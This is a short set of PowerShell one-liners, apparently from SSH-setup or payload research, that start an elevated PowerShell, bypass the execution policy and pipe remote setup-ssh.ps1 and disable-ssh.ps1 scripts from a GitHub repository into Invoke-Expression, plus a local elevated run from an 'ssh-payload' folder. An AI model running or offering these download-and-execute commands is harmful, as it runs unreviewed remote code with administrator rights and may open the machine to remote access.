powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/setup-ssh.ps1 | iex'"

powershell -c "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm https://raw.githubusercontent.com/maimunahmed2/trust-shell/main/disable-ssh.ps1 | iex'"

Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\Research\ssh-payload\disable-ssh.ps1"' -Verb RunAs